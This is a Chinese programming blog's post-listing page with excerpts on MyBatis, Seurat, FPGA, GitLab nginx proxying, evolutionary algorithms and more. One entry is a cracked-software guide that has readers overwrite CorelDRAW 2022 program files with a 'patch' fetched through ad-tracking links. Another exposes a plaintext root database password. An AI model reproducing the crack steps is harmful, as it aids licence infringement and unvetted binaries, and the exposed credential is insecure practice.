<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程爱好者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="编程爱好者博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://bchobby.github.io/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程爱好者博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程爱好者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程爱好者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/89dfdccbb72f06726092d79c4d5471f0/" rel="bookmark">
			最新Mybatis快速上手（详解）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 Mybatis快速学习，最全最详细，入坑狂神，ssm框架必备资源，文档笔记来源：kuangshenstudy，结合视频资源食用更佳，相关资源在文末，有需要自取。
一、Mybatis简介？ MyBatis 本是 Apache 的一个开源项目 iBatis ,2010年这个项目由 Apache Software Foundation 迁移到了 Google Code ，并且改名为 MyBatis。 MyBatis 是一个基于 Java 的持久层框架。 MyBatis 提供的持久层框架包括 sQL Maps 和 Data Access Objects ( DAO )，它消除了几乎所有的 JDBC 代码和参数的手工设置以及结果集的检索。 MyBatis 使用简单的 XML 或注解用于配置和原始映射，将接口和 Java 的 POJOs ( Plain Old Java Objects ，普通的 Java 对象）映射成数据库中的记录。
目前， Java 的持久层框架产品有许多，常见的有 Hibernate 和 MyBatis 。 MyBatis 是一个半自动映射的框架，因为 MyBatis 需要手动匹配PoJ0、 sQL 和映射关系；而 Hibernate 是一个全表映射的框架，只需提供POJ0和映射关系即可。 MyBatis 是一个小巧、方便、高效、简单、直接、半自动化的持久层框架； Hibernate 是一个强大、方便、高效、复杂、间接、全自动化的持久层框架。两个持久层框架各有优缺点，开发者应根据实际应用选择它们。
二、Mybatis的工作原理 读取Mybatis配置文件：（例如数据库连接信息）加载映射文件：（即sql映射文件，该文件中配置了操作数据库的sql语句，mybatis-config.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/89dfdccbb72f06726092d79c4d5471f0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f1f3731b8d83e6e8ffe931933e1fe42c/" rel="bookmark">
			mybatis事务和缓存
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、事务存在的意义
1.事务是什么？
2.Mybatis关于事务的管理
​
二、什么是缓存
1.什么是缓存
2.为什么使用缓存
3.什么样的数据能使用缓存
三、Mybatis缓存
1.一级缓存
1.一级缓存也叫本地缓存
2.测试一级缓存
3. 缓存失效的情况
2.二级缓存
一、事务存在的意义 1.事务是什么？ 多个操作同时进行,那么同时成功，那么同时失败。这就是事务。
事务有四个特性：一致性、持久性、原子性、隔离性
比如现在有两张表，老师和学生，删除这个老师（删除他的学生）
两种表 delete from 老师 where id = ?
delete from 学生 where t_id = ?
如果两个sql同时运行，必须两个都成功。
//配置事务的类型，是用本地事务策略 &lt;transactionManager type="JDBC"&gt;&lt;/transactionManager&gt; 比如有一个订单业务
1.订单表当中添加一条记录
2.商品数量数据更新(减少)
3.....
当多个任务同时进行操作的时候，这些任务只能同时成功，或者同时失败。
2.Mybatis关于事务的管理 MyBatis框架中的事务默认是手动提交的，也就是每次编写程序都需要调用commit()方法提交事务
&lt;transactionManager type="JDBC"&gt;&lt;/transactionManager&gt; ====》程序员自己控制处理的提交和回滚
设置自动提交事务，可以通过openSession的方法进行设置，openSession(true) 自动提交事务。代码如下：（配置中的策略不变）
public class UserTest { private InputStream in = null; private SqlSession session = null; private UserDao mapper = null; @Before //前置通知, 在方法执行之前执行 public void init() throws IOException { //加载主配置文件，目的是为了构建SqlSessionFactory对象 in = Resources.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f1f3731b8d83e6e8ffe931933e1fe42c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ec7d6e35093f5917822f749cb3fa8140/" rel="bookmark">
			Cause: com.mysql.jdbc.exceptions.jdbc4.MySQLNonTransientConnectionException: Could not create connec
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 今天复习mybatis的时候连接mysql出现：
Cause: com.mysql.jdbc.exceptions.jdbc4.MySQLNonTransientConnectionException: Could not create connection to database server.
一直找不到原因，看着像是链接版本不支持，后查阅资料把mysql-connector版本升级，同时驱动由改为
"com.mysql.cj.jdbc.Driver
问题解决。
mybatis配置文件 &lt;dataSource type="POOLED"&gt; &lt;!--property name="driver" value="com.mysql.cj.jdbc.Driver"/--&gt; #这个可以 &lt;property name="driver" value="com.mysql.jdbc.Driver"/&gt; #这个升级mysql链接驱动也行，但是会提醒用com.mysql.cj.jdbc.Drive &lt;property name="url" value="jdbc:mysql://vps:3306/db1?useSSL=false"/&gt; &lt;property name="username" value="root"/&gt; &lt;property name="password" value="thriller830"/&gt; &lt;/dataSource&gt; pom文件 &lt;!-- mysql 驱动 --&gt; #之前 &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;5.1.32&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; #版本升级 &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;8.0.15&lt;/version&gt; &lt;/dependency&gt; 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/05d0bad3852b91f8e3f1e4b7d13ed044/" rel="bookmark">
			【单细胞分析】P2.5、聚类，筛选marker基因，可视化
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		「生信技能树」单细胞数据挖掘_哔哩哔哩_bilibilihttps://www.bilibili.com/video/BV1pa4y1s76J?p=8
#5.1 聚类 pc.num=1:20 #基于PCA数据 scRNA &lt;- FindNeighbors(scRNA, dims = pc.num) # dims参数，需要指定哪些pc轴用于分析；这里利用上面的分析，选择20 scRNA &lt;- FindClusters(scRNA, resolution = 0.5) table(scRNA@meta.data$seurat_clusters) 这里构建pc.nmu这个数列，相当于选取20个元素进行后续的计算。
Seurat识别细胞类群的原理（FindNeighbors和FindClusters） - 简书众所周知，seurat在降维之后主要依据两个函数来进行细胞分类，这里我们来深入了解一下seurat如何进行细胞分类的。首先我们来看有关分类的两个函数 我们来一一解决其中的问题...https://www.jianshu.com/p/ad6e616db6d6
findneighbors和findclusters是两种计算集合距离的方法，本质是用以判断两个集合的相似性。
dims在这里是选取的细胞数，resolution是分辨率，如果值越高，分的cluster越多，越低则产生的cluster越少。
# 进行线性降维处理 scRNA = RunTSNE(scRNA, dims = pc.num) DimPlot(scRNA, reduction = "tsne",label=T) ?RunTSNE p3_1 &lt;- DimPlot(scRNA, reduction = "tsne",label=T) + labs(tag = "E") p3_1 t-SNE
笔记 | 什么是TSNE - 知乎https://zhuanlan.zhihu.com/p/49073961里面有个英文教程，很适合理解t-SNE的基本原理。
本质是通过t分布转化高维数据的相似性信息并将之映射到低维的数据点中。
5.2 marker gene
#5.2 marker gene #进行差异分析，一般使用标准化数据 scRNA &lt;- NormalizeData(scRNA, normalization.method = "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/05d0bad3852b91f8e3f1e4b7d13ed044/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/09d547311c3c1c0d201e4f2fc9696446/" rel="bookmark">
			join()方法是否会释放锁？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		众所周知，join()方法底层调用了wait()方法，那么wait()方法明明是会释放锁的，为什么会有join是否释放锁的这个问题出现呢?原因是因为join()方法只会释放内部锁（自己方便的叫法），不会释放外部锁（自己方便的叫法）。
废话不多说，上代码
public synchronized void test(Object obj){ //join不释放锁 可能引起死锁 thread.join(); } public synchronized void test(Thread thread){ //join释放锁 ，正常执行 thread.join(); } //解析如下 public synchronized void test(Object obj){ //join不释放锁，指的不会释放obj的锁，但是释放了thread的对象锁 //也就是相当于一个可重入锁 thread.join(); //上面的代码相当于 synchronized(Thread thread){ thread.wait(); } //然后wait释放时，释放了thread的对象锁,不会释放Obj的锁 } 总结
join只会释放内部锁，不会释放外部锁。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/18f216076ea78216dd50cd95e32e7af2/" rel="bookmark">
			node配置淘宝镜像源
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 npm config set registry https://registry.npm.taobao.org npm config set sass_binary_site https://npm.taobao.org/mirrors/node-sass/ 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/313d66f63c4f1de2f2d36091f21adc8a/" rel="bookmark">
			进化算法——昂贵、有噪声与动态适应度函数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.昂贵适应度函数 在很多实际问题中，对适应度做一次评价会需要几分钟、几小时、几天甚至更长时间的计算或实验。我们在这里讨论如何减少适应度评价所需的时间以便降低进化算法对计算量的要求。
实际问题涉及的适应度函数常常包含下列的一种或多种特征：
做一次适应度函数评价需要数分钟、数小时、数天的时间；不能以并行的方式评价适应度函数；适应度函数评价的次数受到时间或其他资源的限制 下面几种方式有助于减少适应度函数评价的计算量。
对以评价过得个体不再计算其费用。如果个体看起来很好或太差，可以缩短适应度函数评价。如果需要在大量案例测试中评价费用函数，可以用测试案例的一个子集求近似费用。如果在计算机上评价适应度函数，可以采用让软件运行加速的标准方法。 （1）适应度函数的近似 我们可以建立适应度函数模型以减少评价适应度函数的工作。即使计算量不是瓶颈，我们也可以使用适应度函数模型来改善进化算法的性能。我们称这样的模型为代理、响应曲面或元模型。用代理这个词是因为可以用适应度模型临时替换精确的适应度评价。用元模型这个词是因为适应度评价本身也是一个近似值。因此，适应度函数模型是对高阶模型的降阶。
假设有一个适应度函数f(x)，我们已经在M个个体上对它做了评价。可以利用这M个函数值估计搜索空间中任一点的适应度。下图说明适应度估计的基本思路，基于已知的函数值生成一个估计。
几乎所有的近似算法都能用于适应度近似。最简单的一个估计算法是将个体的适应度近似为已经评价过得最近邻居的适应度。这个方法被称为适应度模仿，它退化为适应度景观的分段常值近似。
在上图中，当得到新的数据时应该如何更新适应度估计。我们希望适应度估计算法是迭代的，当有新的适应度信息时就更新。然而，如果适应度景观是动态的，在生成的时候估计算法不能完全相信旧的适应度函数。用新的数据更新适应度近似被称为在线代理更新。
适应度近似的另个一方法基于父代的适应度值为子代分配适应度，它被称为适应度继承。我们可以将子代的适应度近似为父代适应度值的平均，或者它与每一个父代的相似程度取加权平均。这个想法可以推广到子代有任意多父代的算法，也可以将这个思路扩展，让子代的适应度近似为整个群众适应度的加权平均，由子代与种群中已被评价过得每一个个体相似的程度来决定权重。还可以采用更高级的适应度继承，比如考虑独立变量和适应度值之间的相关性。特别地，对于多目标问题，适应度继承仅在帕累托前沿连续且为凸的情况下才有效。
a.多项式模型 适应度模仿的分段常值近似是一个好的起点，它告诉我们如何将适应度近似扩展为高阶多项式。例如，可以将适应度近似为线性函数
其中，n是问题的维数，x(k)是个体x的第k个元素。这是多项式模型的一个简单例子，它也被称为响应曲面，通过解下面的问题可以算出a(k)的值：
其中，M是我们已经确切知道适应度值的个体数，是其中第i个个体，是的第k个元素。欲求出让（2）式最小的（n+1）个参数a(k)，k属于[0,n]，可以用迭代最小二乘法，当得到更多适应度值（M=1,2，以此类推）时更新（2）式的解所需的计算量很少。
我们可以写出一个比（1）式线性模型更精确的模型：
这是一个二次模型，有（n^2+n+1）个参数。此模型关于参数a(k)和a(j，k)仍然是线性的，可以用迭代最小二乘法来求解，只要领会了多项式建模的思想，就可以尝试不同形式的模型，比如：
其中，g(·)和·h(·)可以是任意的线性或非线性函数。
我们也许想用非最小二乘的方法来近似适应度模型，比如，不是通过求解（2）式而是求解下面的问题找出模型：
这里还是（n+1）个参数a(k)上最小化。下图显示了最小化估计误差的平方和与最小最大化估计误差之间的差别。
（2）式的最小二乘准则较好，因为容易用解析方法求解，但最小最大化准则可能更稳健，因为能找出在最坏情况下误差最小的近似。为了在搜索空间的较困难的区域中减小近似误差，最小最大化近似会牺牲掉搜索空间中易于拟合区域的近似误差。
b.计算机实验的设计与分析 计算机实验设计与分析DACE是一个随机的近似方法，它用诊断测试度量近似的好坏。已知n维向量x的M个适应度函数评价，我们假定适应度函数可以近似为
其中，是一个常数（不一定是适应度函数评价的均值），是一个修正项。DACE假定,对所有x修正项是均值为0方差为的高斯分布；也就是说，f(x)的概率密度函数为
DACE的另一个重要假设是，对于x的不同值， 不独立，即若x的值相似，修正项也应该相似。DACE假定和之间的关系数可以表示如下：
其中，是第i个候选解的第k个元素，∈[1,2]和是参数模型，＞0是一个距离度量。若小，和的相关性接近1；若大，和的相关性接近0。已知M个适应度函数评价，我们把它们集中写成向量的形式：
其中，是一个列向量，它的每一个元素都是1.注意，我们用符号f(x)表示单个候选解x的适应度，也表示M个元素的向量，它包含的M个适应度；（9）中M个适应度函数的高斯概率密度哈数为
其中，C是协方差矩阵，方差都为的两个随机变量和之间的协方差可以表示为如下
因此，（10）式可以写成
其中，R是相关矩阵，R的第i行第j列的元素等于。
已知一组候选解和适应度评价f(x)的向量，我们可以找出测量得到的f(x)的值与假定的f(x)的参数形式匹配得最好的和的值。已知f(x)的随机性质，（12）式给出f(x)的概率密度函数与得到具体的f(x)的可能性成正比。因此，为找到f(x)的参数形式与f(x)的测量值之间的最好的拟合，我们要找出让（12）式的PDF(f(x))最大的和。首先考虑关于的偏导数并令它等于0，得到
这里忽略坟墓中的2，因为他独立于，解（13）式，有
取（12）式关于的偏导数，得到
令上面的式子等于0，有
（14）和（16）式给出了用DACE近似适应度函数的和的最优值。
现考虑候选解的M个适应度函数评价f(x)。假设适应度函数相关，如（8）式所示，假设我们得到另一个候选解的适应度函数评价。将适应度函数向量扩大为（M+1）个元素。
新的相关矩阵为
其中，r是M个适应度函数评价f(x)与新增的适应度函数评价的相关性向量。 我们想要关于 最大化（12）式的概率密度函数，由此得到最适合新数据 的形如（16）式的估计。它被称为极大似然估计。通过最大化
就能最大化（12）式的概率密度函数。用矩阵求逆引理可以证明
将它带入（19）式，有
想要最大化这个关于的表达式，就对求导并置为零，即
求，得到
这个式子告诉我们如何利用已有的模型来近似新的点的适应度值。推导出近似的均方误差为
我们利用均方误差可以为更多的适应度评价确定合适的采样点。在搜索空间中有两个区域会特别需要更多的适应度评价。首先，在适应度近似的最小值附近采样以期找到优化问题的更好的解。其次，在均方误差大的区域采样，因为这些区域中有很大的不确定性。
选择采样点以提高建模的准确度这种方式被称为主动学习。主动学习通常意味着学习算法中通过采样点来优化某个费用函数。
只要得到新的候选解，就可以用（23）式计算其适应度近似。
例1，我们用DACE估计二维Branin基准函数
其中，x(1)和x(2)是候选解的两个分量（n=2）。函数的域是x(1)∈[-5,10]，x(2)∈[0.15]。首先要决定用哪些采样点。我们在这里任意选定25个均匀分布于二维搜索域的采样点（M=25）。下面用MATLAB中的fmincon函数关于和最大化（12）式得到
接下来利用（23）式在细网格上近似f(x)。结果如下图所示，这个近似很好的捕捉了基准函数的基本形状，尤其是多峰的特征。
上例用的是均匀采样，用其他的采样方法得到的结果可能效果会更好。常用的采样方法有Latin超立方采样。此方法在每一维上将域分割为多个区间，然后在每一维的每一个区间中只设置一个采样点。与均匀采样相比，有时候它能捕捉函数无法预知的未知特征。下图说明均匀采样和Latin超立方采样的区别。
（a）显示在搜索域中均匀采样的4个点，（b）显示Latin超立方采样。注意，每一行每一列都只有一个点。Latin超立方采样不唯一。 例2，用Latin超立方采样与DACE估计例1的二维函数。我们任意决定用21个采样点（M=21）。用 MATLAB中的fmincon函数关于和最大化（12）式得到
接下来利用（23）式在细网格上近似f(x)。结果如下图所示，看起来用Latin超立方采样的结果比均匀采样的好。事实上，例1中用均匀采样的DACE近似的均方误差是24.9，而用Latin超立方采样的均方误差是14.3。即使采样点少，由Latin超立方采样得到的近似误差比均匀采样几乎好50%。可见采样方法会明显影响DACE的近似结果。
（2）近似变换函数 适应度近似方法有时候表现得不好，（23）式的DACE方法需要对矩阵求逆，但矩阵的逆可能不存在。如果逆不存在，可以用伪逆。不过，这里的要点是用来近似适应度函数的基函数可能与适应度函数的形状不太匹配。例如，用傅里叶函数近似一个不规则并带有尖锐边缘的函数，就不能指望在所有的函数域中的所有点上都有好的近似。在这种情况下，可以先对原始的适应度函数做变换，然后找出变换后的函数的近似。例如，我们对M个采样点评价了它的适应度函数。如果近似效果不好，在变换时可以取适应度函数样本的自然对数：
然后用采样点的找出L(x)的近似，记为。然后通过反变换得到原函数的近似：
例3，我们在Goldstein-Price函数上用DACE方法。
其中，x(1)和x(2)的域为[-2,2]。这个函数在它的最小值附近很平坦，在(1)=0和(2)=1处函数达到最小值，=3.DACE的近似方法对这个平坦的区域无能为力。
因为在平坦的区域中采样点高度相关，这意味着相关矩阵R中的一些列几乎全部都由1组成，R几乎是奇异的。 在本例中我们选用采样点的自然对数，如（29）式所示。函数的形状因此发生了巨大改变；它将靠在一起的较小的f(x)值摊开，将较大的f(x)值聚拢，这样会让相似的函数值分开同时压缩函数的总范围。然后我们用DACE近似L(x)，再计算原始函数的近似，如（30）式所示，凭借对近似过程的简单修改，我们可以得到一个不错的近似，如下图所示。
（3）在进化算法中如何使用适应度近似 这里有几个方案，首先，可以让适应度近似只替换固定比例r的适应度评价。假设适应度函数评价在进化算法的计算量中占据支配地位，这会让计算量从E减少到（1-r）E。但我们不能滥用这个思路，如果用近似替换的适应度评价过多，进化算法的收敛需要更多的时间，这样反而会浪费计算资源。在极端情况下，如果用近似替换所有的适应度评价r=1.此时计算量的确可能近似为0，但进化算法不会收敛到一个有用的结果。
另一个方案是在每一代多生成一些子代并用它们的近似适应度值决定哪些留作下一代。我们称这个想法为进化控制，或模型管理。如果用准确适应度评价某些个体并用近似适应度函数评价其他个体，我们称之为个体进化控制。可以用不同的方法决定哪些个体用准确评价哪些个体用近似评价。比如，对每一个个体随机的决定它的评价方式。也可以在每一代只对近似适应度好的个体用准确适应度评价。用准确适应度评价的个体被称为受控个体。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/313d66f63c4f1de2f2d36091f21adc8a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/eb59867aac33d5f2c597bc38f1f7254b/" rel="bookmark">
			FPGA&amp;MSP430实现等精度频率计
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前段时间依次实现了FPGA的等精度频率计和FPGA与430的通信测试。
FPGA频率计：Verilog设计练习 基于FPGA的等精度频率计_Krism0912的博客-CSDN博客_用verilog设计等精度频率计
FPGA与430通信测试：
FPGA与MSP430G2553通信 UART串口操作_Krism0912的博客-CSDN博客
由于FPGA中对数据运算过于麻烦，所以此次将上述两个成果进行了整合，将FPGA的数据通过串口传至MSP430后再进行运算。
在整合过程中碰到的一个百思不得其解的问题：串口测试中发现传输过去的Nx的值总是理论值的2倍。花了几个小时才最终弄清楚原因，下面稍做记录。
错误出现在FPGA的uart_tx原代码的改写。
改写的代码如下：
module uart_tx_1(
input clk, //9600Hz input [39:0]data_Nx,
input [39:0]data_Nb,
input rst,
input send_start_flag,
output reg txd
);
//串口发送状态机分为四个状态：等待、发送起始位、发送数据、发送完成
localparam IDLE = 0,
SEND_START = 1,
SEND_DATA = 2,
SEND_END = 3;
reg [3:0] state = IDLE;
reg [4:0] count = 0;
reg [39:0] data_o_tmp=0;
reg send_flag=0;
reg [6:0] send_data_num =0;
always @(posedge clk or negedge rst) begin if(!rst)
state &lt;= IDLE;
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/eb59867aac33d5f2c597bc38f1f7254b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/830036b0e269797d380052d852996266/" rel="bookmark">
			gitlab使用外部nginx反向代理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. vim /etc/gitlab/gitlab.rb
编辑nginx['listen_port'] = 8888
此处的8888端口将用于proxy_pass处
2. 编辑外部nginx，在http区加入server段
server { listen 80; server_name git.corp.demo.com; location / { # 这个大小的设置非常重要，如果 git 版本库里面有大文件，设置的太小，文件push 会失败，根据情况调整 client_max_body_size 50m; proxy_redirect off; #以下确保 gitlab中项目的 url 是域名而不是 http://git，不可缺少 proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; # 反向代理到 gitlab 内置的 nginx ，192.168.100.120为gitlab内容nginx服务IP地址 proxy_pass http://192.168.100.120:8888; #index index.html index.htm; } } 3. 重新reload nginx
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b55b24ea702412e85fae9185664bfd4c/" rel="bookmark">
			MATLAB报错：位置 3 处的索引超出数组边界(不能超出 1)。
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		博主造成这个问题的原因是数据中有单通道的灰度图，因此读入时有错误。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5648225e4dcb80180f6cc42815eceda5/" rel="bookmark">
			Halcon形态学操作、区域处理相关常用API
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		膨胀一般用来填补物体中小的空洞和狭窄的缝隙，使物体的尺寸增大。
膨胀运算需要生成结构内核才能完成，在HALCON中使用gen_circle来生成圆形结构内核，这个函数的参数中：
（1）第一个参数Circle为输出的圆形结构区域；
（2）第二个参数Row为输入圆形区域中心行坐标；
（3）第三个参数是Column为输入圆形区域中心列坐标。
使用gen_rectangle1来生成矩形结构内核，这个函数的参数中：
（1）第一个参数Rectangle为输出的矩形结构区域；
（2）第二个参数Row1为输入的矩形区域的左上角点行坐标；
（3）第三个参数Column1位输入的矩形区域左上角点列坐标；
（4）第四个参数Row2为输入的矩形区域的右下角点行坐标；
（5）第五个参数Column2为输入的矩形区域右下角点列坐标。
使用gen_rectangle2来生成可以旋转的矩形结构内核，这个函数的参数中：
（1）第一个参数Rectangle为输出的矩形结构区域；
（2）第二个参数Row为输入矩形中心行坐标；
（3）第三个参数Column为输入矩形中心列坐标；
（4）第四个参数Phi为矩形的长轴与x轴的夹角，范围为-π/2～π/2；
（5）第五个参数Length1为矩形的长轴的长度的一半，即半长轴；
（6）第六个参数Length2为矩形的短轴的长度的一半，即半短轴。
使用gen_ellipse来生成椭圆结构内核，这个函数的参数中：
（1）第一个参数Ellipse为输出的椭圆结构区域；
（2）第二个参数Row为输入椭圆中心行坐标；
（3）第三个参数Column为输入椭圆中心列坐标；
（4）第四个参数Phi为椭圆的长轴与x轴的夹角，范围为-π/2～π/2；
（5）第五个参数Radius1为椭圆的长轴；
（6）第六个参数Radius2为椭圆的短轴。
使用gen_region_polygon函数来生成多边形结构内核，这个函数的参数中：
（1）第一个参数Region为输出的多边形结构内核区域；
（2）第二个参数Rows为多边形的角点的行坐标组；
（3）第三个参数Columns为多边形的角点的列坐标组。
在HALCON当中，使用dilation1函数来实现膨胀变换，这个函数的参数中：
（1）第一个参数Region为要进行膨胀的区域；
（2）第二个参数StructElement为结构内核区域；
（3）第三个参数RegionDilation为膨胀后的区域；
（4）第四个参数Iterations为迭代的次数。
使用dilation2函数来实现可以改变结构内核锚点的膨胀，这个函数的参数中：
（1）第一个参数Region为要进行膨胀的区域；
（2）第二个参数StructElement为结构内核区域；
（3）第三个参数RegionDilation为膨胀后的区域；
（4）第四个参数Row为锚点的行坐标；
（5）第五个参数Column为锚点的列坐标；
（6）第六个参数Iterations为迭代的次数。
使用dilation_circle函数来实现以圆为结构内核的膨胀，这个函数的参数中：
（1）第一个参数Region为要进行膨胀的区域；
（2）第二个参数RegionDilation为膨胀后的区域；
（3）第三个参数Radius为圆形内核的半径。
使用dilation_rectangle1函数来实现以长方形为结构内核的膨胀，这个函数的参数中：
（1）第一个参数Region为要进行膨胀的区域；
（2）第二个参数RegionDilation为膨胀后的区域；
（3）第三个参数Width为结构内核的宽度；
（4）第四个参数Height为结构内核的高度。
腐蚀用来消除小块区域和细长的区域。
开运算是先腐蚀再膨胀，利用结构元素B对A进行开运行的数学表达式为A◦B=（AΘB）⊕B
开运算能够使得图像边缘变得平滑，消除毛刺和狭窄的连接，但是又可以保持本体区域大小不变。
在HALCON中使用opening函数来实现开运算，这个函数的参数中：
（1）第一个参数Region为要进行开运算的区域；
（2）第二个参数StructElement为结构内核区域；
（3）第三个参数RegionOpening为开运算后的区域。
使用opening_circle来实现圆形结构内核的开运算，这个函数的参数中：
（1）第一个参数Region为要进行开运算的区域；
（2）第二个参数RegionOpening为开运算后的区域；
（3）第三个参数Radius为圆形结构内核的半径。
使用opening_rectangle1来实现矩形结构内核的开运算，这个函数的参数中：
（1）第一个参数Region为要进行开运算的区域；
（2）第二个参数RegionOpening为开运算后的区域；
（3）第三个参数Width为矩形内核的宽度；
（4）第四个参数Height为矩形内核的高度。
闭运算是先膨胀再腐蚀，利用结构元素B对A进行闭运行的数学表达式为A·B=（A⊕B）ΘB
闭运算能够填补小型黑洞，并连接区域。
在HALCON中使用closing函数来实现闭运算，这个函数的参数中：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5648225e4dcb80180f6cc42815eceda5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7b44c120778ef2ebcf8be1a996f39f79/" rel="bookmark">
			cdr2022补丁源文件实战安装教程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		cdr2022功能很多，支持手动绘图，支持使用模板绘图，支持文本编辑，支持表格编辑，支持图形效果调整，为用户提供更丰富的图形设计方案，非常适合需要设计矢量图的朋友使用！
1、下载并进行解压即可获得cdr2022文件以及布丁
2、双击“Setup.exe”依提示进行安装，使用自动生成的离线安装
3、选择安装类型，点击自定义安装
4、安装你想要的程序
5、点击安装
6、安装完成
7、将布丁复制替换到 C:\Program Files\Corel\CorelDRAW Graphics Suite 2022\Programs64 目录下即可
8、至此，软件安装成功，用户可以使用，以上就是coreldraw2022版的详细安装教程
从令人惊叹的艺术作品到震撼的网页设计和出色打印，它能为你提供所有工具，让你的工作更快、更智能，让你打造满意的效果。利用一系列丰富直观的工具、内置的学习资料、样本文件和项目模板，快速、轻松开始创作。
最后该软件就安装可以使用了!直接下载2022
CorelDRAW2022订阅版mac-安装包
https://wm.makeding.com/iclk/?zoneid=49497
CorelDRAW2022订阅版win-安装包
https://wm.makeding.com/iclk/?zoneid=49498
2022 版新增功能，颠覆性协作工具
与客户和同事进行前所未有的设计交流。在云端与您的审阅者共享您的概念，使用 CorelDRAW.app 邀请他们查看并直接在您的 CorelDRAW 设计文件上进行注释和评论。将一个或多个参与者的反馈全部集中到一处（即您的工作文件中），让设计更改变得更加容易。
2022 版新增功能，先进的排版
全新的排版技术和增强版的核心键入工具实现精美排版。
通过可变字体支持微调字体。
使用全新的编号列表和增强版项目符号列表，轻松设置段落格式。
享受 Web 和桌面之间无缝衔接的文本工作流程。
2020 版新增功能，全新水平的跟踪结果
令人印象深刻的全新 AI 驱动的 PowerTRACE™，让您享受出色的位图转矢量图跟踪结果。利用最先进的图像优化技术，可以提高跟踪时的位图质量。
2022 版新增功能，了不起的人工智能驱动图像解决方案
机器学习的模型可以帮助提高您的设计能力并加快工作流程，让人惊艳。
利用人工智能放大图像而不失细节。
消除高度压缩 JPEG 图像产生的噪点
将新的机器学习的效果应用于位图和矢量。
使用新的“智能选择”工具可以更快、更准确地创建遮罩。
2022 版新增功能，性能大幅提升
使用明显更快、响应更灵敏的应用程序套件，可以更高效地工作并获得更好的结果。最高十倍于上一版本的速度，让您在最快的时间内完成概念到设计完成的整个过程。
2022 版新增功能，一切因您而更美好
感谢您的宝贵意见，我们在 CorelDRAW 中增强了“查找和替换”\“对齐和分布”、阴影效果等功能。您最喜欢的 Corel PHOTO-PAINT 功能 — 从遮罩、效果和透镜到“替换颜色”— 均已优化！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dfa8a4e2516b72735d1d64138bdad68c/" rel="bookmark">
			分布式事务相关面试题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
